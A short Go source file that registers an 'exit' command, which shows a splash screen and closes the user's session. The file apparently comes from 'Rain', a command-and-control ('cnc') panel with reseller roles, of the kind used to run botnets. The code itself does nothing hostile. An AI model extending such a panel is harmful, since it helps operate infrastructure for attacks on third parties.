package Commands

import (
	Execute "Rain/core/config/views/user"
	"Rain/core/masters/sessions"
)

func init() {
	Load_Commands(&Command_interface{
		Name:        "exit",
		Roles:       []string{"everyone"},
		Admin:       false,
		Reseller:    false,
		Description: "Closes your connection to the cnc",
		CommandExecution: func(session *Sessions.Session, cmd []string) error {

			_, error := Execute.Execute_Standard("exit-splash", session.User, session.Channel, true, false)
			if error != nil {
				return error
			}

			session.Channel.Close() // closes the session
			return nil
		},
	})
}
